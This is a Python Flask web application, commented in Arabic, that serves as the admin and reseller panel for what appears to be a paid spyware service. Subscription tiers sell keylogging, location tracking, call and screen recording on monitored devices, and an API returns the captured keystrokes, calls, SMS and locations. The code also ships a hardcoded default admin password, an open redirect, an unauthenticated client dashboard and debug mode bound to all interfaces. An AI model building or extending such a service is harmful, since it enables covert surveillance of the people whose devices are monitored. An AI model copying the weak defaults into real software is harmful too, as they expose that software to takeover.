#!/usr/bin/env python3
"""
🌐 لوحة التحكم المركزية النهائية لإدارة العملاء
Ultimate Central Dashboard for Client Management
"""

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SelectField, BooleanField, TextAreaField
from wtforms.validators import DataRequired, Email, Length
from werkzeug.security import generate_password_hash, check_password_hash
import uuid
import json
import secrets
from datetime import datetime, timedelta
from typing import Dict, List, Any
import sqlite3
from pathlib import Path

class CentralDashboardManager:
    """مدير لوحة التحكم المركزية"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = secrets.token_hex(32)
        self.app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///central_dashboard.db'
        self.app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
        
        self.db = SQLAlchemy(self.app)
        self.login_manager = LoginManager()
        self.login_manager.init_app(self.app)
        self.login_manager.login_view = 'login'
        
        self.setup_database_models()
        self.setup_routes()
        self.setup_login_manager()
        
        with self.app.app_context():
            self.db.create_all()
            self.create_default_admin()
    
    def setup_database_models(self):
        """إعداد نماذج قاعدة البيانات"""
        
        class User(UserMixin, self.db.Model):
            """نموذج المستخدم"""
            id = self.db.Column(self.db.Integer, primary_key=True)
            username = self.db.Column(self.db.String(80), unique=True, nullable=False)
            email = self.db.Column(self.db.String(120), unique=True, nullable=False)
            password_hash = self.db.Column(self.db.String(255), nullable=False)
            role = self.db.Column(self.db.String(20), default='admin')
            is_active = self.db.Column(self.db.Boolean, default=True)
            created_at = self.db.Column(self.db.DateTime, default=datetime.utcnow)
            last_login = self.db.Column(self.db.DateTime)
            
            clients = self.db.relationship('Client', backref='admin', lazy=True)
        
        class Client(self.db.Model):
            """نموذج العميل"""
            id = self.db.Column(self.db.Integer, primary_key=True)
            client_id = self.db.Column(self.db.String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
            name = self.db.Column(self.db.String(100), nullable=False)
            email = self.db.Column(self.db.String(120), nullable=False)
            phone = self.db.Column(self.db.String(20))
            company = self.db.Column(self.db.String(100))
            subscription_type = self.db.Column(self.db.String(20), default='basic')
            subscription_status = self.db.Column(self.db.String(20), default='active')
            subscription_start = self.db.Column(self.db.DateTime, default=datetime.utcnow)
            subscription_end = self.db.Column(self.db.DateTime)
            dashboard_url = self.db.Column(self.db.String(255))
            api_key = self.db.Column(self.db.String(64), default=lambda: secrets.token_hex(32))
            created_at = self.db.Column(self.db.DateTime, default=datetime.utcnow)
            updated_at = self.db.Column(self.db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
            
            admin_id = self.db.Column(self.db.Integer, self.db.ForeignKey('user.id'), nullable=False)
            
            devices = self.db.relationship('Device', backref='client', lazy=True, cascade='all, delete-orphan')
            subscriptions = self.db.relationship('Subscription', backref='client', lazy=True)
        
        class Device(self.db.Model):
            """نموذج الجهاز"""
            id = self.db.Column(self.db.Integer, primary_key=True)
            device_id = self.db.Column(self.db.String(36), unique=True, nullable=False)
            device_name = self.db.Column(self.db.String(100))
            device_type = self.db.Column(self.db.String(20))  # android, ios, windows, mac, linux
            os_version = self.db.Column(self.db.String(50))
            app_version = self.db.Column(self.db.String(20))
            last_seen = self.db.Column(self.db.DateTime, default=datetime.utcnow)
            status = self.db.Column(self.db.String(20), default='offline')  # online, offline, monitoring
            location = self.db.Column(self.db.Text)  # JSON string
            monitoring_features = self.db.Column(self.db.Text)  # JSON string
            created_at = self.db.Column(self.db.DateTime, default=datetime.utcnow)
            
            client_id = self.db.Column(self.db.Integer, self.db.ForeignKey('client.id'), nullable=False)
            
            monitoring_data = self.db.relationship('MonitoringData', backref='device', lazy=True)
        
        class Subscription(self.db.Model):
            """نموذج الاشتراك"""
            id = self.db.Column(self.db.Integer, primary_key=True)
            subscription_id = self.db.Column(self.db.String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
            plan_name = self.db.Column(self.db.String(50), nullable=False)
            plan_type = self.db.Column(self.db.String(20), nullable=False)  # basic, premium, enterprise
            device_limit = self.db.Column(self.db.Integer, default=1)
            features = self.db.Column(self.db.Text)  # JSON string
            price = self.db.Column(self.db.Float)
            currency = self.db.Column(self.db.String(3), default='USD')
            billing_cycle = self.db.Column(self.db.String(20), default='monthly')  # monthly, yearly
            status = self.db.Column(self.db.String(20), default='active')
            start_date = self.db.Column(self.db.DateTime, default=datetime.utcnow)
            end_date = self.db.Column(self.db.DateTime)
            auto_renew = self.db.Column(self.db.Boolean, default=True)
            created_at = self.db.Column(self.db.DateTime, default=datetime.utcnow)
            
            client_id = self.db.Column(self.db.Integer, self.db.ForeignKey('client.id'), nullable=False)
        
        class MonitoringData(self.db.Model):
            """نموذج بيانات المراقبة"""
            id = self.db.Column(self.db.Integer, primary_key=True)
            data_type = self.db.Column(self.db.String(50), nullable=False)  # keylogger, calls, sms, location, etc.
            data_content = self.db.Column(self.db.Text)  # JSON string
            timestamp = self.db.Column(self.db.DateTime, default=datetime.utcnow)
            processed = self.db.Column(self.db.Boolean, default=False)
            
            device_id = self.db.Column(self.db.Integer, self.db.ForeignKey('device.id'), nullable=False)
        
        class Analytics(self.db.Model):
            """نموذج التحليلات"""
            id = self.db.Column(self.db.Integer, primary_key=True)
            metric_name = self.db.Column(self.db.String(50), nullable=False)
            metric_value = self.db.Column(self.db.Float)
            metric_data = self.db.Column(self.db.Text)  # JSON string
            date = self.db.Column(self.db.Date, default=datetime.utcnow().date)
            created_at = self.db.Column(self.db.DateTime, default=datetime.utcnow)
        
        self.User = User
        self.Client = Client
        self.Device = Device
        self.Subscription = Subscription
        self.MonitoringData = MonitoringData
        self.Analytics = Analytics
    
    def setup_login_manager(self):
        """إعداد مدير تسجيل الدخول"""
        @self.login_manager.user_loader
        def load_user(user_id):
            return self.User.query.get(int(user_id))
    
    def setup_routes(self):
        """إعداد المسارات"""
        
        @self.app.route('/')
        @login_required
        def dashboard():
            """لوحة التحكم الرئيسية"""
            total_clients = self.Client.query.count()
            total_devices = self.Device.query.count()
            active_devices = self.Device.query.filter_by(status='online').count()
            total_revenue = self.db.session.query(self.db.func.sum(self.Subscription.price)).scalar() or 0
            
            recent_clients = self.Client.query.order_by(self.Client.created_at.desc()).limit(5).all()
            
            recent_devices = self.Device.query.order_by(self.Device.last_seen.desc()).limit(10).all()
            
            return render_template('dashboard.html',
                                 total_clients=total_clients,
                                 total_devices=total_devices,
                                 active_devices=active_devices,
                                 total_revenue=total_revenue,
                                 recent_clients=recent_clients,
                                 recent_devices=recent_devices)
        
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            """تسجيل الدخول"""
            if request.method == 'POST':
                username = request.form['username']
                password = request.form['password']
                
                user = self.User.query.filter_by(username=username).first()
                
                if user and check_password_hash(user.password_hash, password):
                    login_user(user)
                    user.last_login = datetime.utcnow()
                    self.db.session.commit()
                    
                    next_page = request.args.get('next')
                    return redirect(next_page) if next_page else redirect(url_for('dashboard'))
                else:
                    flash('Invalid username or password', 'error')
            
            return render_template('login.html')
        
        @self.app.route('/logout')
        @login_required
        def logout():
            """تسجيل الخروج"""
            logout_user()
            return redirect(url_for('login'))
        
        @self.app.route('/clients')
        @login_required
        def clients():
            """إدارة العملاء"""
            page = request.args.get('page', 1, type=int)
            clients = self.Client.query.paginate(
                page=page, per_page=20, error_out=False
            )
            return render_template('clients.html', clients=clients)
        
        @self.app.route('/clients/add', methods=['GET', 'POST'])
        @login_required
        def add_client():
            """إضافة عميل جديد"""
            if request.method == 'POST':
                client = self.Client(
                    name=request.form['name'],
                    email=request.form['email'],
                    phone=request.form.get('phone'),
                    company=request.form.get('company'),
                    subscription_type=request.form['subscription_type'],
                    admin_id=current_user.id
                )
                
                client.dashboard_url = f"/client/{client.client_id}/dashboard"
                
                self.db.session.add(client)
                self.db.session.commit()
                
                self.create_client_subscription(client)
                
                flash('Client added successfully', 'success')
                return redirect(url_for('clients'))
            
            return render_template('add_client.html')
        
        @self.app.route('/clients/<client_id>')
        @login_required
        def client_details(client_id):
            """تفاصيل العميل"""
            client = self.Client.query.filter_by(client_id=client_id).first_or_404()
            devices = self.Device.query.filter_by(client_id=client.id).all()
            subscriptions = self.Subscription.query.filter_by(client_id=client.id).all()
            
            return render_template('client_details.html',
                                 client=client,
                                 devices=devices,
                                 subscriptions=subscriptions)
        
        @self.app.route('/client/<client_id>/dashboard')
        def client_dashboard(client_id):
            """لوحة تحكم العميل"""
            client = self.Client.query.filter_by(client_id=client_id).first_or_404()
            devices = self.Device.query.filter_by(client_id=client.id).all()
            
            device_stats = {}
            for device in devices:
                stats = {
                    'total_data': self.MonitoringData.query.filter_by(device_id=device.id).count(),
                    'recent_data': self.MonitoringData.query.filter_by(device_id=device.id)
                                  .filter(self.MonitoringData.timestamp >= datetime.utcnow() - timedelta(hours=24))
                                  .count()
                }
                device_stats[device.device_id] = stats
            
            return render_template('client_dashboard.html',
                                 client=client,
                                 devices=devices,
                                 device_stats=device_stats)
        
        @self.app.route('/devices')
        @login_required
        def devices():
            """إدارة الأجهزة"""
            page = request.args.get('page', 1, type=int)
            devices = self.Device.query.paginate(
                page=page, per_page=20, error_out=False
            )
            return render_template('devices.html', devices=devices)
        
        @self.app.route('/analytics')
        @login_required
        def analytics():
            """التحليلات"""
            analytics_data = self.generate_analytics_data()
            return render_template('analytics.html', analytics=analytics_data)
        
        @self.app.route('/api/clients', methods=['GET'])
        @login_required
        def api_clients():
            """API للحصول على العملاء"""
            clients = self.Client.query.all()
            return jsonify({
                'clients': [{
                    'id': client.client_id,
                    'name': client.name,
                    'email': client.email,
                    'subscription_type': client.subscription_type,
                    'status': client.subscription_status,
                    'devices_count': len(client.devices),
                    'created_at': client.created_at.isoformat()
                } for client in clients]
            })
        
        @self.app.route('/api/devices', methods=['GET'])
        @login_required
        def api_devices():
            """API للحصول على الأجهزة"""
            devices = self.Device.query.all()
            return jsonify({
                'devices': [{
                    'id': device.device_id,
                    'name': device.device_name,
                    'type': device.device_type,
                    'status': device.status,
                    'last_seen': device.last_seen.isoformat() if device.last_seen else None,
                    'client_name': device.client.name
                } for device in devices]
            })
        
        @self.app.route('/api/monitoring_data/<device_id>')
        @login_required
        def api_monitoring_data(device_id):
            """API للحصول على بيانات المراقبة"""
            device = self.Device.query.filter_by(device_id=device_id).first_or_404()
            
            data_type = request.args.get('type', 'all')
            limit = request.args.get('limit', 100, type=int)
            
            query = self.MonitoringData.query.filter_by(device_id=device.id)
            
            if data_type != 'all':
                query = query.filter_by(data_type=data_type)
            
            monitoring_data = query.order_by(self.MonitoringData.timestamp.desc()).limit(limit).all()
            
            return jsonify({
                'device_id': device_id,
                'data': [{
                    'type': data.data_type,
                    'content': json.loads(data.data_content) if data.data_content else {},
                    'timestamp': data.timestamp.isoformat()
                } for data in monitoring_data]
            })
        
        @self.app.route('/api/client/<client_id>/create_dashboard', methods=['POST'])
        @login_required
        def api_create_client_dashboard(client_id):
            """API لإنشاء لوحة تحكم العميل"""
            result = self.create_client_dashboard(client_id)
            return jsonify(result)
    
    def create_default_admin(self):
        """إنشاء مدير افتراضي"""
        admin = self.User.query.filter_by(username='admin').first()
        if not admin:
            admin = self.User(
                username='admin',
                email='admin@monitoring.com',
                password_hash=generate_password_hash('admin123'),
                role='super_admin'
            )
            self.db.session.add(admin)
            self.db.session.commit()
    
    def create_client_dashboard(self, client_id: str) -> Dict[str, Any]:
        """إنشاء لوحة تحكم خاصة بعميل"""
        client = self.Client.query.filter_by(client_id=client_id).first()
        if not client:
            return {'status': 'error', 'message': 'Client not found'}
        
        dashboard_config = {
            'client_id': client_id,
            'dashboard_url': f"/client/{client_id}/dashboard",
            'api_endpoints': {
                'devices': f"/api/client/{client_id}/devices",
                'monitoring_data': f"/api/client/{client_id}/monitoring_data",
                'commands': f"/api/client/{client_id}/commands"
            },
            'features': self.get_client_features(client),
            'theme': 'default',
            'language': 'en',
            'created_at': datetime.utcnow().isoformat()
        }
        
        client.dashboard_url = dashboard_config['dashboard_url']
        self.db.session.commit()
        
        return {
            'status': 'success',
            'dashboard_config': dashboard_config,
            'access_url': dashboard_config['dashboard_url'],
            'api_key': client.api_key
        }
    
    def create_client_subscription(self, client):
        """إنشاء اشتراك العميل"""
        subscription_plans = {
            'basic': {
                'device_limit': 1,
                'features': ['keylogger', 'location_tracking'],
                'price': 29.99
            },
            'premium': {
                'device_limit': 5,
                'features': ['keylogger', 'location_tracking', 'call_recording', 'screen_recording'],
                'price': 79.99
            },
            'enterprise': {
                'device_limit': 50,
                'features': ['all'],
                'price': 299.99
            }
        }
        
        plan = subscription_plans.get(client.subscription_type, subscription_plans['basic'])
        
        subscription = self.Subscription(
            plan_name=f"{client.subscription_type.title()} Plan",
            plan_type=client.subscription_type,
            device_limit=plan['device_limit'],
            features=json.dumps(plan['features']),
            price=plan['price'],
            end_date=datetime.utcnow() + timedelta(days=30),
            client_id=client.id
        )
        
        self.db.session.add(subscription)
        self.db.session.commit()
    
    def get_client_features(self, client) -> List[str]:
        """الحصول على ميزات العميل"""
        subscription = self.Subscription.query.filter_by(client_id=client.id, status='active').first()
        if subscription and subscription.features:
            return json.loads(subscription.features)
        return ['basic_monitoring']
    
    def generate_analytics_data(self) -> Dict[str, Any]:
        """إنشاء بيانات التحليلات"""
        total_clients = self.Client.query.count()
        active_clients = self.Client.query.filter_by(subscription_status='active').count()
        
        total_devices = self.Device.query.count()
        online_devices = self.Device.query.filter_by(status='online').count()
        
        total_revenue = self.db.session.query(self.db.func.sum(self.Subscription.price)).scalar() or 0
        monthly_revenue = self.db.session.query(self.db.func.sum(self.Subscription.price))\
                         .filter(self.Subscription.billing_cycle == 'monthly').scalar() or 0
        
        subscription_types = self.db.session.query(
            self.Subscription.plan_type,
            self.db.func.count(self.Subscription.id)
        ).group_by(self.Subscription.plan_type).all()
        
        return {
            'clients': {
                'total': total_clients,
                'active': active_clients,
                'inactive': total_clients - active_clients
            },
            'devices': {
                'total': total_devices,
                'online': online_devices,
                'offline': total_devices - online_devices
            },
            'revenue': {
                'total': total_revenue,
                'monthly': monthly_revenue,
                'yearly': total_revenue - monthly_revenue
            },
            'subscriptions': dict(subscription_types)
        }
    
    def run(self, host='0.0.0.0', port=8000, debug=False):
        """تشغيل التطبيق"""
        self.app.run(host=host, port=port, debug=debug)

def create_templates():
    """إنشاء قوالب HTML"""
    templates_dir = Path("templates")
    templates_dir.mkdir(exist_ok=True)
    
    base_template = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}Central Dashboard{% endblock %}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="{{ url_for('dashboard') }}">
                <i class="fas fa-shield-alt"></i> Central Dashboard
            </a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="{{ url_for('dashboard') }}">Dashboard</a>
                <a class="nav-link" href="{{ url_for('clients') }}">Clients</a>
                <a class="nav-link" href="{{ url_for('devices') }}">Devices</a>
                <a class="nav-link" href="{{ url_for('analytics') }}">Analytics</a>
                <a class="nav-link" href="{{ url_for('logout') }}">Logout</a>
            </div>
        </div>
    </nav>
    
    <div class="container mt-4">
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <div class="alert alert-{{ 'danger' if category == 'error' else category }} alert-dismissible fade show">
                        {{ message }}
                        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                    </div>
                {% endfor %}
            {% endif %}
        {% endwith %}
        
        {% block content %}{% endblock %}
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    {% block scripts %}{% endblock %}
</body>
</html>'''
    
    with open(templates_dir / "base.html", "w") as f:
        f.write(base_template)
    
    dashboard_template = '''{% extends "base.html" %}

{% block title %}Dashboard - Central Dashboard{% endblock %}

{% block content %}
<div class="row">
    <div class="col-md-3">
        <div class="card bg-primary text-white">
            <div class="card-body">
                <div class="d-flex justify-content-between">
                    <div>
                        <h4>{{ total_clients }}</h4>
                        <p>Total Clients</p>
                    </div>
                    <div class="align-self-center">
                        <i class="fas fa-users fa-2x"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card bg-success text-white">
            <div class="card-body">
                <div class="d-flex justify-content-between">
                    <div>
                        <h4>{{ total_devices }}</h4>
                        <p>Total Devices</p>
                    </div>
                    <div class="align-self-center">
                        <i class="fas fa-mobile-alt fa-2x"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card bg-info text-white">
            <div class="card-body">
                <div class="d-flex justify-content-between">
                    <div>
                        <h4>{{ active_devices }}</h4>
                        <p>Active Devices</p>
                    </div>
                    <div class="align-self-center">
                        <i class="fas fa-wifi fa-2x"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card bg-warning text-white">
            <div class="card-body">
                <div class="d-flex justify-content-between">
                    <div>
                        <h4>${{ "%.2f"|format(total_revenue) }}</h4>
                        <p>Total Revenue</p>
                    </div>
                    <div class="align-self-center">
                        <i class="fas fa-dollar-sign fa-2x"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="row mt-4">
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5>Recent Clients</h5>
            </div>
            <div class="card-body">
                <div class="table-responsive">
                    <table class="table table-sm">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Email</th>
                                <th>Plan</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for client in recent_clients %}
                            <tr>
                                <td>{{ client.name }}</td>
                                <td>{{ client.email }}</td>
                                <td>{{ client.subscription_type.title() }}</td>
                                <td>
                                    <span class="badge bg-{{ 'success' if client.subscription_status == 'active' else 'danger' }}">
                                        {{ client.subscription_status.title() }}
                                    </span>
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5>Recent Devices</h5>
            </div>
            <div class="card-body">
                <div class="table-responsive">
                    <table class="table table-sm">
                        <thead>
                            <tr>
                                <th>Device</th>
                                <th>Type</th>
                                <th>Status</th>
                                <th>Last Seen</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for device in recent_devices %}
                            <tr>
                                <td>{{ device.device_name or device.device_id[:8] }}</td>
                                <td>{{ device.device_type.title() if device.device_type else 'Unknown' }}</td>
                                <td>
                                    <span class="badge bg-{{ 'success' if device.status == 'online' else 'secondary' }}">
                                        {{ device.status.title() }}
                                    </span>
                                </td>
                                <td>{{ device.last_seen.strftime('%Y-%m-%d %H:%M') if device.last_seen else 'Never' }}</td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}'''
    
    with open(templates_dir / "dashboard.html", "w") as f:
        f.write(dashboard_template)
    
    login_template = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Central Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6 col-lg-4">
                <div class="card mt-5">
                    <div class="card-header text-center">
                        <h4>Central Dashboard Login</h4>
                    </div>
                    <div class="card-body">
                        {% with messages = get_flashed_messages(with_categories=true) %}
                            {% if messages %}
                                {% for category, message in messages %}
                                    <div class="alert alert-{{ 'danger' if category == 'error' else category }}">
                                        {{ message }}
                                    </div>
                                {% endfor %}
                            {% endif %}
                        {% endwith %}
                        
                        <form method="POST">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary w-100">Login</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>'''
    
    with open(templates_dir / "login.html", "w") as f:
        f.write(login_template)

def main():
    """الدالة الرئيسية"""
    create_templates()
    
    dashboard = CentralDashboardManager()
    
    print("🌐 Central Dashboard Manager")
    print("📊 Dashboard URL: http://localhost:8000")
    print("👤 Default Login: admin / admin123")
    print("🚀 Starting server...")
    
    dashboard.run(debug=True)

if __name__ == "__main__":
    main()
